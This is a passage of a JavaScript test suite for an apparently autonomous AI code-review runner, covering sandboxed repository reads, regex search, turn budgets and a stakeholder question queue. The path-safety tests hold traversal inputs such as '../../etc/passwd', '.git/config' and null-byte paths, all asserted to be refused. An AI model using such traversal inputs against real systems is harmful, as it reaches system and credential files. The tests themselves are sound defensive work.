    chk('  the register_finding examples are valid JSON the gate would ACCEPT', ok === 2);
    chk('  and one of them demonstrates the probe form', probeForm === 1);
    // Reachability: a field the dispatcher reads that nothing tells the model about is unreachable in practice.
    chk('  the action description tells the agent about probe',
        src.includes('supply probe={file,content}'));
    chk('  and the dispatcher actually reads it off the action',
        src.includes('probe: next.probe'));
    chk('  and the hunting round tells the agent most real defects have no failing test',
        src.includes('MOST REAL DEFECTS ARE NOT CAUGHT BY ANY EXISTING TEST'));
  }
  const R = mkdtempSync(join(tmpdir(), 'repo-regex-'));
    try {
      const { mkdirSync, writeFileSync: wf } = await import('node:fs');
      mkdirSync(join(R, 'test'));
      const LF = String.fromCharCode(10);
      wf(join(R, 'test', 'a.test.mjs'), ['assert.ok(x);', 'assert.equal(y, 1);', 'const z = 3;'].join(LF) + LF);
      const rx = await searchRepoFiles(R, 'assert\\.ok\\(|assert\\.equal\\(', 'test/a.test.mjs');
      eq('  the pattern that used to return zero now matches both lines', [rx.ok, rx.hits.length, rx.mode], [true, 2, 'regex']);
      const lit = await searchRepoFiles(R, 'assert', 'test/a.test.mjs');
      eq('  and a literal still runs as a literal', [lit.hits.length, lit.mode], [2, 'literal']);
      const bad = await searchRepoFiles(R, 'foo|(', 'test/a.test.mjs');
      chk('  a pattern that will not compile says so rather than returning nothing', bad.ok === false && /will not compile/.test(bad.error));
      const uns = await searchRepoFiles(R, '(a+)+b|c', 'test/a.test.mjs');
      chk('  and a dangerous one is refused, not run', uns.ok === false && /backtrack/.test(uns.error));
    } finally { rmSync(R, { recursive: true, force: true }); }
  }
  {
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  the reply states which mode ran', src.includes('read as a LITERAL substring'));
    chk('  an unresolved path is reported instead of silently widening the scope', src.includes('const askedForPath = want && !target'));
    chk('  and an empty result no longer claims absolute absence', src.includes('for THIS spelling'));
  }
}
console.log("# investigate — a truncated read cannot show ABSENCE, so there is a search that can");
{
  // The defect this closes was mine, and it manufactured a false finding. Round two of a five-round hunt claimed "the
  // 'invite' provider in PROVIDERS is not handled in auth.mjs". False: it is handled at lines 273-304 and documented at
  // 220. But the file is 20,279 bytes and I had just capped reads at 4,000 to keep a small model coherent — so the agent
  // saw PROVIDERS on line 6, saw two providers handled, and never saw the third. It reasoned correctly from evidence I
  // truncated. A prefix is evidence of PRESENCE and never of ABSENCE.
  const R = mkdtempSync(join(tmpdir(), "repo-search-"));
  try {
    const { mkdirSync, writeFileSync: wf } = await import("node:fs");
    mkdirSync(join(R, "src"));
    // The shape of the real defect: the term appears once early and again far past any prefix cap.
    // Built by joining an array so no escape sequence has to survive the layers between here and the file.
    const LF = String.fromCharCode(10);
    const authLines = ['export const PROVIDERS = ["dev", "oidc", "invite"];'];
    for (let i = 0; i < 600; i++) authLines.push('// filler');
    authLines.push('export function redeemInvite() { return { provider: "invite" }; }');
    wf(join(R, 'src', 'auth.mjs'), authLines.join(LF) + LF);
    wf(join(R, 'src', 'other.mjs'), 'export const x = 1;' + LF);

    const early = await readRepoFile(R, "src/auth.mjs", 200);
    chk("  a prefix read is truncated and says so", early.ok && early.truncated && early.content.length === 200);
    chk("  and the later occurrence is genuinely not in it", !early.content.includes("redeemInvite"));

    const s = await searchRepoFiles(R, "invite", "src/auth.mjs");
    chk("  the search finds BOTH occurrences, including the one past the cap", s.ok && s.hits.length >= 2 && s.hits.some((h) => h.text.includes("redeemInvite")));
    chk("  with file and line numbers", s.hits.every((h) => h.file === "src/auth.mjs" && h.line > 0));
    // The control that makes an empty result meaningful: absence must be reportable as absence.
    const none = await searchRepoFiles(R, "zzz_not_here_at_all", "src/auth.mjs");
    eq("  a genuinely absent term reports zero", [none.ok, none.hits.length], [true, 0]);
    const all = await searchRepoFiles(R, "export");
    chk("  with no path it searches the whole repository", all.ok && new Set(all.hits.map((h) => h.file)).size === 2);
    eq("  an empty term is refused rather than matching everything", (await searchRepoFiles(R, "  ")).ok, false);
    chk("  and an escape attempt is refused", !(await searchRepoFiles(R, "x", "../../etc/passwd")).ok);
    {
      const capped = await searchRepoFiles(R, "filler", "src/auth.mjs", 5);
      eq("  the cap is on MATCHES, not on position in the file", [capped.hits.length, capped.truncated], [5, true]);
    }
    {
      const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
      chk("  a truncated read tells the agent it cannot prove absence from the body alone",
        src.includes("Do not conclude anything is absent from the partial body alone"));
      chk("  a term in command searches instead of reading — but only when it does not name a file",
        src.includes("if (term && term !== want && !resolveRepoTarget(all.files || [], term))"));
      chk("  and an unattended hunting round redirects a hard-floor action instead of waiting ten minutes for a CEO",
          src.includes("hunting rounds are unattended") && src.includes('actType === "shell" || actType === "api_call"'));
    }
  } finally { rmSync(R, { recursive: true, force: true }); }
}
console.log("# investigate — the runner works out which file was meant, instead of demanding a formatted path");
{
  // Every fixture here is from a live run. The model asked for a file as title="Read PLAN.md" nine times and got the
  // repository listing back nine times, because there is no path called that. It is not being careless: for every other
  // action `title` is a human-readable label, so it writes one, and saying "title=the PATH and nothing else" in the doc
  // line did not change that and will not — the instruction fights the shape of every other action in the list.
  const FILES = ["README.md", "PLAN.md", "src/db.mjs", "src/http.mjs", "test/roster.test.mjs", "tools/precheck.mjs", "public/app.css"];
  eq("  a bare path that exists", resolveRepoTarget(FILES, "src/db.mjs"), "src/db.mjs");
  eq("  the observed failure: a sentence naming one file", resolveRepoTarget(FILES, "Read PLAN.md"), "PLAN.md");
  eq("  a longer sentence with the path inside it", resolveRepoTarget(FILES, "look at the src/db.mjs file"), "src/db.mjs");
  eq("  a basename that is unique in the repo", resolveRepoTarget(FILES, "precheck.mjs"), "tools/precheck.mjs");
  eq("  trailing punctuation does not defeat it", resolveRepoTarget(FILES, "check PLAN.md, then continue."), "PLAN.md");
  eq("  backslashes are normalised", resolveRepoTarget(FILES, "src" + String.fromCharCode(92) + "db.mjs"), "src/db.mjs");
  // The controls. Without them a resolver that returned FILES[0] for everything would pass all six lines above.
  eq("  a label naming no file resolves to nothing, so the caller lists", resolveRepoTarget(FILES, "List repo"), null);
  eq("  and so does a description of intent", resolveRepoTarget(FILES, "check the roster test"), null);
  eq("  a file that is not in the repository resolves to nothing", resolveRepoTarget(FILES, "src/secrets.mjs"), null);
  eq("  an escape attempt resolves to nothing, because it is not in the list", resolveRepoTarget(FILES, "../../etc/passwd"), null);
  eq("  nothing at all", resolveRepoTarget(FILES, ""), null);
  {
    // Ambiguity: showing both beats picking one, because picking one silently reviews the wrong file.
    const dup = [...FILES, "public/index.html", "docs/index.html"];
    eq("  an ambiguous basename resolves to nothing", resolveRepoTarget(dup, "index.html"), null);
    eq("  but the full path still works", resolveRepoTarget(dup, "docs/index.html"), "docs/index.html");
  }
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    chk("  the dispatch resolves before it reads, from whichever field carries the path",
        src.includes("resolveRepoTarget(all.files || [], want)") && src.includes("resolveRepoTarget(all.files || [], termRaw)"));
    chk("  and a miss lists rather than dead-ending", src.includes("const listInstead ="));
  }
}
console.log("# investigate — the hunting rounds are executed, not decomposed");
{
  // Found live, not by reading: pointed at a real repository the phase ran two rounds, spent 327 seconds, produced ~25
  // sub-verdicts and read zero files. In company mode runGated's worker is a DELEGATION — it hands the objective to a
  // manager that decomposes it — so a lens instruction naming one way of looking and one action arrived at the agents
  // as paraphrased sub-tasks. A lens that reaches an agent as somebody's summary of it is not that lens.
  const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
  const iGated = src.indexOf("async function runGated(run, worker, persistExtra, perAgentTally");
  chk("  runGated was located", iGated > 0);
  chk("  it accepts a solo worker", src.slice(iGated, iGated + 200).includes("soloWorker"));
  const iHunter = src.indexOf("const hunter = soloWorker || worker");
  chk("  the investigate call uses it in preference to the delegating one", iHunter > iGated);
  // Stated as an invariant, not a byte distance. This was slice(iHunter, iHunter + 200), and adding ONE longer line
  // between the two pushed the call past the window: the assertion failed while the property it names stayed true.
  // What matters is that the next investigate call after the hunter is built is the one that receives it, with no
  // other investigate call slipping in between.
  const iInv = src.indexOf("investigate(run, hunter,", iHunter);
  chk("  and passes THAT to investigate", iInv > iHunter);
  chk("  with nothing else calling investigate in between",
      !/\binvestigate\(run,\s*(?!hunter\b)/.test(src.slice(iHunter, iInv)));
  const iDel = src.indexOf("async function runDelegation");
  const del = src.slice(iDel, src.indexOf("async function runGated", iDel));
  chk("  company mode was located and builds one", iDel > 0 && del.includes("const soloWorker = principal ?"));
  chk("  from runAgentTask directly, so the objective is not decomposed", del.includes("runAgentTask(run, principal, org, objective)"));
  chk("  and hands it to runGated", del.includes("tally, soloWorker)"));
  // The control: every assertion above is a substring search, so prove the searches can fail.
  chk("  and these checks can fail", !src.includes("const hunter = soloWorker || notAWorker") && !del.includes("runAgentTask(run, nobody,"));
}
console.log("# investigate — reading the repository under investigation, and staying inside it");
{
  // Why this exists: the hunting phase could verify a finding in the repo and could not READ the repo. read_file reads
  // the drafts directory; findingRepo was referenced in exactly one place, the gate. So an agent was asked to supply a
  // check command and a fix quoting exact anchor text from a file it had never seen — structurally unable to find a
  // real defect, and every refusal would have looked like an honest gate over a careless model.
  const BS = String.fromCharCode(92);   // a real backslash; a lost one turns an escape test into a test of nothing
  const R = mkdtempSync(join(tmpdir(), "repo-read-"));
  try {
    const { mkdirSync, writeFileSync } = await import("node:fs");
    mkdirSync(join(R, "src")); mkdirSync(join(R, ".git")); mkdirSync(join(R, "node_modules"));
    writeFileSync(join(R, "src", "db.mjs"), "export const q = 1;\n");
    writeFileSync(join(R, ".git", "config"), "[core]\n");
    writeFileSync(join(R, "node_modules", "dep.js"), "module.exports = 1;\n");
    writeFileSync(join(R, "README.md"), "x".repeat(50));
    const inside = (p) => { const a = repoPathSafe(R, p); return !!a && (a === R || a.startsWith(R + String.fromCharCode(92)) || a.startsWith(R + "/")); };

    chk("  a normal path resolves inside the repo", inside("src/db.mjs"));
    chk("  and it is refused for a repo that is not configured", repoPathSafe("", "src/db.mjs") === null);
    chk("  and for the filesystem root itself", repoPathSafe(process.platform === "win32" ? "C:" + BS : "/", "x") === null);
    // Refused everywhere: these mean the same thing on every platform. A forward slash is a separator and a NUL is
    // never a filename, whatever the OS.
    for (const [label, p] of [
      ["dot-dot with forward slashes", "../../etc/passwd"],
      ["the git directory", ".git/config"],
      ["a dependency", "node_modules/dep.js"],
      ["nothing at all", ""],
      ["a null byte", "src/db" + String.fromCharCode(0) + ".mjs"],
    ]) chk("  refused: " + label, repoPathSafe(R, p) === null);

    // Windows path SYNTAX, which is not path syntax anywhere else. `\` is a separator and `C:` a drive only on
    // win32; on Linux both are ordinary filename characters, so these resolve to one strangely-named file INSIDE
    // the repo — which is the safe outcome, not a weaker one.
    //
    // These three assertions asserted refusal unconditionally and cost this project ten days of red CI. They pass
    // on the machine they were written on and cannot pass on the machine the gate runs on, and the runner printed
    // the wrong 25 lines, so nothing said which two of eight hundred assertions had gone red.
    //
    // The invariant is the same in both branches — the guard NEVER yields a path outside the repository — and only
    // the mechanism differs: refusal on win32, containment elsewhere. Asserting the invariant is what makes this a
    // security check rather than a check on `path.sep`.
    for (const [label, p] of [
      ["dot-dot with backslashes", ".." + BS + ".." + BS + "secret"],
      ["dot-dot buried mid-path", "src" + BS + ".." + BS + ".." + BS + ".." + BS + "secret"],
      ["a windows absolute path", "C:/Windows/win.ini"],
    ]) {
      const got = repoPathSafe(R, p);
      chk(`  windows-shaped path stays inside the repo or is refused: ${label}`,
          process.platform === "win32" ? got === null : (got === null || inside(p)));
    }
    // Deliberate: a leading separator is STRIPPED, not honoured, so an absolute-looking path lands inside the repo
    // rather than on the real filesystem. The property under test is where it ends up, not whether it was allowed.
    chk("  a unix-absolute path is read as repo-relative, not as absolute", inside("/etc/passwd"));
    // The control on every 'refused' line above: the checker must be able to say yes, or they all pass vacuously.
    chk("  the checker can still say yes, so the refusals above mean something", repoPathSafe(R, "README.md") !== null);

    const f = await readRepoFile(R, "src/db.mjs");
    eq("  a real file comes back with its content", [f.ok, f.content.trim()], [true, "export const q = 1;"]);
    eq("  and its repo-relative name, with forward slashes", f.name, "src/db.mjs");
    const esc = await readRepoFile(R, "../../etc/passwd");
    chk("  an escape attempt is refused by the reader too, not only the path check", esc.ok === false && /not inside/.test(esc.error));
    const dir = await readRepoFile(R, "src");
    chk("  a directory says to list it instead", dir.ok === false && /directory/.test(dir.error));
    const small = await readRepoFile(R, "README.md", 10);
    eq("  the cap truncates and says so", [small.content.length, small.truncated, small.bytes], [10, true, 50]);

    const l = await listRepoFiles(R);
    chk("  listing finds the source", l.ok && l.files.includes("src/db.mjs") && l.files.includes("README.md"));
    chk("  and hides the git directory and the dependencies", !l.files.some((x) => x.startsWith(".git") || x.startsWith("node_modules")));
    const sub = await listRepoFiles(R, "src");
    eq("  a subdirectory can be listed on its own", sub.files, ["src/db.mjs"]);
  } finally { rmSync(R, { recursive: true, force: true }); }
}
console.log("# an absent worker executor must not be re-proved at full price");
{
  // Measured on a real hunting round: two web_search actions spent 300 of the round's 349 seconds establishing the same
  // fact twice — that no worker executor exists. waitForExecution polled its whole 150-second deadline both times.
  const NOW = 1000000;
  eq("  never seen absent: the full deadline", executorProbeMs(NOW, 0), 150000);
  eq("  seen absent a minute ago: a short probe", executorProbeMs(NOW, NOW - 60000), 8000);
  eq("  seen absent 20 minutes ago: full again, so it self-heals", executorProbeMs(NOW, NOW - 1200000), 150000);
  eq("  exactly at the ttl boundary it is full again", executorProbeMs(NOW, NOW - 600000), 150000);
  // The control: a function that always returned the short probe would pass line two and fail these.
  chk("  the short probe is genuinely shorter", executorProbeMs(NOW, NOW - 1) < executorProbeMs(NOW, 0));
  eq("  and the observed round would now cost 158s instead of 300s", (150000 + executorProbeMs(NOW, NOW - 1)) / 1000, 158);
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    chk("  waitForExecution uses it rather than the raw deadline", src.includes("executorProbeMs(Date.now(), EXECUTOR_ABSENT_AT, ms)"));
    chk("  a success forgets the memo, so a returning worker is not penalised", src.includes("EXECUTOR_ABSENT_AT = 0;"));
    chk("  and a timeout records it", src.includes("EXECUTOR_ABSENT_AT = Date.now();"));
    chk("  a failed search during a hunt points back at the repository", src.includes("the repository is the place to check a claim about the code"));
  }
}
console.log("# a round that runs out of turns must not look like a round that found nothing");
{
  // Counted from a live paid round: exactly 12 actions with maxTurns 12, ending mid-sentence one search into
  // "how does rolesOf handle a missing personId". Zero findings AND zero refused claims — it never made a claim,
  // because the round ran out underneath it and nothing said so. Same defect as the empty-action loop and the
  // silent scope widening: a constraint the agent is subject to and never told about.
  const w = (o) => turnBudgetWarning({ maxTurns: 12, phase: 'investigate', ...o });
  eq('  nothing at turn 9 of 12', w({ turn: 9 }), '');
  chk('  it warns with two left', w({ turn: 10 }).length > 0);
  chk('  and with one', /Only 1 action left/.test(w({ turn: 11 })));
  chk('  and says so on the last', /LAST action/.test(w({ turn: 12 })));
  eq('  once only, never every turn', w({ turn: 11, warned: true }), '');
  // The controls. A construction turn that runs out just makes a shorter document; only a review round ends with
  // nothing and looks identical to one that genuinely found nothing.
  eq('  silent during construction', turnBudgetWarning({ turn: 11, maxTurns: 12, phase: 'work' }), '');
  eq('  and with no phase at all', turnBudgetWarning({ turn: 11, maxTurns: 12 }), '');
  {
    const m = w({ turn: 11 });
    chk('  it offers registering a finding', /register_finding/.test(m));
    chk('  it offers the honest empty answer as legitimate', /honest empty round is a real answer/.test(m));
    chk('  and names the failure it is preventing', m.includes('looks') && m.includes('found nothing'));
  }
  {
    const src = readFileSync(new URL('../server.mjs', import.meta.url), 'utf8');
    chk('  the turn loop fires it', src.includes('turnBudgetWarning({ turn, maxTurns: run.maxTurns'));
    chk('  and latches so it cannot repeat', src.includes('let warnedLowTurns = false'));
    chk('  the round prompt also states the budget up front', src.includes('You get a LIMITED number of actions'));
  }
}
console.log("# investigate — after a file comes back, the agent is told what to do with it");
{
  // Live run five, and the write-up of it was wrong first time round. The model read 10kB of README, produced a
  // PERFECTLY VALID turn whose speak was "I'll provide a valid JSON response with the required structure", and finished
  // with nothing. I recorded that as the model losing the JSON format — it cannot have been: the "say" event only fires
  // after safeParse succeeds. The real gap was that the read result ended with a constraint and no direction, while the
  // lens instruction had been given once, a listing and 4000 characters of source earlier.
  const run = { phase: "investigate", currentLens: LENSES[3] };
  const g = postReadGuidance(run);
  chk("  it repeats the lens instruction verbatim, where the decision is made", g.includes(LENSES[3].prompt));
  chk("  it offers reading another file", /read_repo/.test(g));
  chk("  it offers registering a finding, with the evidence rule attached", /register_finding/.test(g) && /fails because of it/.test(g));
  chk("  it offers the empty answer, and says it is usually the right one", /shows nothing here/.test(g) && /right one most/.test(g));
  chk("  and it forbids finishing without saying which", /Do NOT finish without saying which/.test(g));
  // The controls: this must not fire outside a hunting round, or every construction file_read gets a hunting lecture.
  eq("  nothing during ordinary construction", postReadGuidance({ phase: "work", currentLens: LENSES[0] }), "");
  eq("  nothing when no lens is in play", postReadGuidance({ phase: "investigate" }), "");
  eq("  and nothing for a run object that has neither", postReadGuidance({}), "");
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    chk("  the read result appends it", src.includes("postReadGuidance(run)}"));
    chk("  and the round records which lens is in play, or there is nothing to repeat", src.includes("run.currentLens = lens"));
  }
}
console.log("# investigate — the completeness critic, and what stops it filling the register with junk");
{
  // The register is a list, so its blind spots are exactly the ones it can never report. A critic can name them — and
  // will happily name imaginary ones too, at the cost of a paid round on every future run. Hence a gate with the same
  // shape as the finding gate: evidence the runner can check, not a claim the model makes about itself.
  const FOUND = [{ claim: "the GDPR export omits the volunteer_notes table", where: "src/export.mjs:41" }];
  const good = { id: "money-path", prompt: "Follow every path where money or credentials move, and ask who could take it without being logged.", because: "the GDPR export omits the volunteer_notes table" };
  const no = (label, body, needle) => {
    const r = normalizeLens({ ...good, ...body }, { existing: LENSES, findings: FOUND });
    chk("  " + label, r.ok === false && (!needle || r.reason.includes(needle)));
  };
  no("no id", { id: "" });
  no("an id already in the register", { id: LENSES[0].id }, "already a lens");
  no("a topic instead of an instruction", { prompt: "security" }, "not an instruction");
  no("a long noun phrase is still not an instruction", { prompt: "Data retention coverage across the whole application surface and its edges" }, "instruction verb");
  no("a restatement of a lens already there",
     { prompt: "Find every number and date stated in prose or config, and derive the true value." }, "in different words");
  no("no finding cited", { because: "" }, "name the confirmed finding");
  // THE rule. Without it the critic invents a coverage gap to look thorough and bills for it forever.
  no("a finding that was never confirmed this run", { because: "the login page has no rate limit" }, "does not match any finding");
  {
    const r = normalizeLens(good, { existing: LENSES, findings: FOUND });
    chk("  a real instruction citing a real finding is accepted", r.ok === true);
    eq("  and it keeps the evidence with it", r.lens.because, good.because);
  }
  {
    // The control on the whole block: with no findings at all, nothing can be proposed — which is why the critic round
    // does not even run on a dry investigate phase.
    const r = normalizeLens(good, { existing: LENSES, findings: [] });
    chk("  with no confirmed findings nothing can be proposed", r.ok === false);
  }
  {
    eq("  a paraphrase is reported by the id it duplicates",
       lensParaphrase("Find every number, count or date stated in prose or config and derive the true value", LENSES), "stale-claim");
    eq("  and a genuinely different way of looking is not a paraphrase", lensParaphrase(good.prompt, LENSES), null);
    eq("  an empty prompt paraphrases nothing", lensParaphrase("", LENSES), null);
  }
}
console.log("# investigate — a proposed lens is capped, and the least productive one makes room");
{
  const mk = (i) => ({ id: "p" + i, prompt: "Trace something specific number " + i, because: "x" });
  {
    const org = {}; seedLenses(org);
    for (let i = 0; i < 4; i++) eq("  proposal " + i + " is added", addProposedLens(org, mk(i), i).added, true);
    eq("  four proposals sit alongside the built-ins", org.lenses.filter((l) => l.proposed).length, 4);
    chk("  and they are marked as proposed, with the evidence kept", org.lenses.find((l) => l.id === "p0").proposed === true);
    // All four are dry, so the coldest one is evicted rather than the register growing without limit.
    const fifth = addProposedLens(org, mk(9), 99);
    eq("  a fifth still lands", fifth.added, true);
    eq("  but the count is held", org.lenses.filter((l) => l.proposed).length, 4);
    // The control: eviction must not touch the built-ins.
    eq("  and no built-in was evicted to make room", LENSES.every((l) => org.lenses.some((x) => x.id === l.id)), true);
  }
  {
    // If every proposal is earning its round, nothing is thrown away — a productive register must not churn.
    const org = {}; seedLenses(org);
    for (let i = 0; i < 4; i++) { addProposedLens(org, mk(i), i); org.lenses.find((l) => l.id === "p" + i).found = 2; }
    const r = addProposedLens(org, mk(9), 99);
    eq("  a full register of productive proposals refuses the new one", r.added, false);
    chk("  and says why", /finding things/.test(r.reason));
  }
}
console.log("# investigate — the critic round asks about the METHOD, and only when there is evidence");
{
  const run = { findings: [{ claim: "the retention sweep only runs when a season expires", where: "src/jobs.mjs:12" }] };
  const o = lensProposalObjective(run, LENSES.slice(0, 3));
  chk("  it lists the ways of looking the company already has", o.includes(LENSES[0].id) && o.includes(LENSES[2].id));
  chk("  it lists what was actually found", o.includes("the retention sweep only runs when a season expires"));
  chk("  it names the action and its three fields", o.includes("propose_lens") && o.includes("kebab-case"));
  chk("  it asks about the method, not the code", /way of looking/.test(o) && /METHOD/.test(o));
  // Without this the critic proposes something every single time, because saying nothing feels like failing the task.
  chk("  and it says plainly that 'already covered' is the useful answer most of the time", /perfectly good answer|most of the time/.test(o));
  {
    const src = readFileSync(new URL("../server.mjs", import.meta.url), "utf8");
    const inv = src.slice(src.indexOf("export async function investigate"));
    const body = inv.slice(0, inv.indexOf('emit(run, "investigated"'));
    const code = body.split("\n").filter((l) => !l.trim().startsWith("//")).join("\n");
    chk("  the critic round is skipped when the phase found nothing", code.includes("(run.findings || []).length && opts.critique !== false"));
    chk("  and it is one round, not a loop", code.split("lensProposalObjective").length === 2);
    const pl = src.slice(src.indexOf('=== "propose_lens") {'));
    const plBody = pl.slice(0, pl.indexOf('=== "ask_stakeholder") {'));
    const iWrite = plBody.indexOf('await updateOrg('), iCheck = plBody.indexOf('normalizeLens(');
    chk('  the propose_lens branch was located and holds both halves', plBody.length > 300 && iWrite >= 0 && iCheck >= 0);
    chk('  and it checks the register INSIDE the write that appends to it, so it cannot validate a stale read',
        iWrite >= 0 && iCheck > iWrite && plBody.includes('seedLenses(o)'));
  }
}
console.log("# investigate — the round prompt carries what the agent needs and nothing it should repeat");
{
  const run = { findings: [{ claim: "the export omits notes" }], rejectedFindings: [{ claim: "a hunch", reason: "the check passes already" }] };
  const o = investigateObjective(run, LENSES[0], { E: { count: 9 }, B: { count: 4 } });
  chk("  it says the criteria passing is not the same as being right", /passed its acceptance criteria/.test(o));
  chk("  it carries the lens instruction verbatim", o.includes(LENSES[0].prompt));
  chk("  it lists the confirmed finding so it is not re-found", /CONFIRMED: the export omits notes/.test(o));
  chk("  it lists the REFUSED claim with its reason, so it is not resubmitted", /ALREADY REFUSED \(the check passes already\): a hunch/.test(o));
  chk("  it ranks the company's known classes, commonest first", /E x9, B x4/.test(o));
  chk("  and it invites an honest empty round", /honest empty round/.test(o));
  const bare = investigateObjective({ findings: [], rejectedFindings: [] }, LENSES[1], {});
  chk("  with no history it says nothing about repeats", !/Do NOT repeat/.test(bare));
}


console.log("# investigate — the company round cap is honoured");
{
  const run = { events: [], listeners: new Set(), findings: [], rejectedFindings: [], rounds: [] };
  // maxRounds comes from guardrails.investigateRounds; the hook passes `Number(x) || undefined` so 0 means "default".
  await investigate(run, async () => ({ tokens: 1 }), { dryLimit: 9, maxRounds: 3 });
  eq("  a cap of 3 stops after 3 rounds even with a high dry limit", run.rounds.length, 3);
  const run2 = { events: [], listeners: new Set(), findings: [], rejectedFindings: [], rounds: [] };
  await investigate(run2, async () => ({ tokens: 1 }), { dryLimit: 9, maxRounds: Number(0) || undefined });
  eq("  a cap of 0 falls back to the built-in maximum, not to zero rounds", run2.rounds.length, 8);
}


// ---- the stakeholder question queue -----------------------------------------------------------------------------
//
// The rule under test is the one that makes this produce autonomy instead of more waiting: a question is only accepted
// if the agent says what it is proceeding with meanwhile. Refusals go first, because the refusals ARE the mechanism.
console.log("# ask_stakeholder — a question that stops the work is refused");
{
  const good = { question: "Is the Booth an activity or an event?", assumption: "treating it as an activity with one role", affects: "src/seed.mjs" };
  const no = (label, body, needle) => {
    const r = normalizeQuestion(body);
    chk("  " + label, r.ok === false && (!needle || r.reason.includes(needle)));
  };
  no("no question at all", { ...good, question: "" });
  no("a question with NO assumption is a request to stop", { ...good, assumption: "" }, "stop working");
  no("no place the assumption is written down", { ...good, affects: "" }, "WHERE");
  no("an assumption that ends in a question mark is not a decision", { ...good, assumption: "treat it as an activity?" }, "not a decision");
  no("nor is one that starts with 'should'", { ...good, assumption: "should it be an activity or an event" }, "not a decision");
  no("nor 'unclear'", { ...good, assumption: "unclear, waiting on the CEO" });
  // A fabricated sanction, verbatim from the live run that otherwise SUCCEEDED — the mechanism worked and the
  // wording was still dangerous, which is why the gate is the right place to catch it and not a prompt tweak.
  no("an assumption that claims the CEO approved it", { ...good, assumption: "Assuming the CEO approved the 2-year retention duration" }, "nobody has");
  no("or that it was agreed", { ...good, assumption: "the board agreed to treat it as an activity" }, "nobody has");
  no("or decided", { ...good, assumption: "it was decided to be an activity" });
  {
    // The control: owning the choice is exactly what SHOULD be accepted, and the pattern must not swallow it.
    const r = normalizeQuestion({ ...good, assumption: "I picked 2 years, matching the accounting retention already in the docs" });
    chk("  while owning the choice is accepted", r.ok === true);
  }
  no("an assumption that only restates the question",
     { question: "Which licence do we ship?", assumption: "the licence we ship", affects: "LICENSE" }, "repeats");
  {
    const r = normalizeQuestion(good);
    chk("  a real question with a real assumption is accepted", r.ok === true);
    eq("  and keeps all three fields", [r.question.question, r.question.assumption, r.question.affects],
       [good.question, good.assumption, good.affects]);
  }
  {
    // The dispatch branch hands over title/command/url, not question/assumption/affects.
    const r = normalizeQuestion({ title: "  What is the claim cutoff?  ", command: "  using 2 days  ", url: "board.cutoffDays" });
    chk("  it reads the action's own field names, trimmed", r.ok && r.question.question === "What is the claim cutoff?" && r.question.assumption === "using 2 days");
  }
  {
    const r = normalizeQuestion({ question: "q".repeat(900), assumption: "a".repeat(900), affects: "f".repeat(900) });
    eq("  and caps the three fields", [r.question.question.length, r.question.assumption.length, r.question.affects.length], [400, 400, 200]);
  }
}
console.log("# ask_stakeholder — the same question asked twice is not two questions");
{
  const k = questionKey;
  chk("  wording, order and punctuation can drift", k("Who owns the licence?") === k("the licence — who owns it"));
  chk("  and stopwords do not matter", k("Should we use MIT?") === k("use MIT"));
  chk("  but a different question is a different key", k("who owns the licence") !== k("which licence do we ship"));
  eq("  an empty question has an empty key", k(null), "");
  {
    const org = {};
    const a = recordQuestion(org, { question: "Who owns the licence?", assumption: "MIT, in LICENSE", affects: "LICENSE" }, 1000);
    eq("  the first ask is recorded and open", [a.added, a.question.status, org.questions.length], [true, "open", 1]);
    const b = recordQuestion(org, { question: "the licence — who owns it", assumption: "MIT", affects: "LICENSE" }, 2000);
    eq("  asking it again does not add a second", [b.added, org.questions.length], [false, 1]);
    eq("  it counts the re-ask instead", [b.question.asked, b.question.lastAt], [2, 2000]);
    // The control on the two assertions above: if recordQuestion simply never added, they would both pass anyway.
    const c = recordQuestion(org, { question: "What is the claim cutoff?", assumption: "2 days", affects: "board.cutoffDays" }, 3000);
    eq("  while a genuinely different question IS added", [c.added, org.questions.length], [true, 2]);
    // The one that matters most: an ANSWERED question must still block a re-ask, or an agent can relitigate a
    // decision the CEO already made and quietly get a different answer.
    answerQuestion(org, a.question.id, "MIT is right", 4000);
    const d = recordQuestion(org, { question: "who owns the licence", assumption: "MIT", affects: "LICENSE" }, 5000);
    eq("  and an ANSWERED question is still deduped against", [d.added, d.question.status], [false, "answered"]);
  }
  {
    const org = { questions: [] };
    for (let i = 0; i < 240; i++) recordQuestion(org, { question: "question number " + i, assumption: "x", affects: "y" }, i);
    eq("  the queue is capped", org.questions.length, 200);
    chk("  keeping the newest", org.questions[0].question === "question number 239");
  }
}
console.log("# ask_stakeholder — answering");
{
  const org = { questions: [] };
  const { question: q } = recordQuestion(org, { question: "Whose name goes on it?", assumption: "the company's", affects: "README" }, 1);
  const bad = answerQuestion(org, q.id, "   ");
  chk("  an empty answer is not an answer", bad.ok === false);
  chk("  and neither is one for a question that does not exist", answerQuestion(org, "nope", "yes").ok === false);
  const ok = answerQuestion(org, q.id, "  mine  ", 9);
  eq("  a real answer settles it", [ok.ok, ok.question.answer, ok.question.status, ok.question.answeredAt], [true, "mine", "answered", 9]);
}
console.log("# ask_stakeholder — the queue reaches the next run, which is what closes the loop");
{
  const agent = { name: "Ada", role: "engineer" };
  const org = { questions: [
    { id: "q1", status: "answered", answer: "MIT", question: "Which licence?", assumption: "MIT" },
    { id: "q2", status: "open", question: "Is the Booth an activity?", assumption: "treating it as an activity" },
  ] };
  const p = systemPrompt(org, agent);
  chk("  a settled decision is carried in as settled", p.includes("SETTLED") && p.includes("Which licence?") && p.includes("MIT"));
  chk("  an open question is carried in with the assumption in force", p.includes("PROCEEDING AS IF") && p.includes("treating it as an activity"));
  chk("  and the agent is told not to ask either of them again", p.includes("never ask again") && p.includes("Do NOT ask these again"));
  // The control: those strings must be absent when there is nothing to say, or the assertions above prove only that
  // the prompt is long.
  const bare = systemPrompt({}, agent);
  chk("  with an empty queue the prompt says none of it", !bare.includes("SETTLED") && !bare.includes("PROCEEDING AS IF"));
}
console.log("# ask_stakeholder — the runner notices an unsanctioned decision, because the agent will not");
{
  // This exists because of a negative live result, not a hunch: told to flag an undecidable, the model wrote the
  // assumption into the artifact and finished without queueing anything. Reachable is not the same as reached for.
  for (const s of ["I assumed 24 months.", "Retention is not specified anywhere, so I used 2 years.",
                   "Left as a placeholder.", "Used my best judgment on the cutoff.", "Defaulted to 30 days for now.",
                   "The period is TBD.", "I picked 12 months.", "This should be confirmed by the board."])
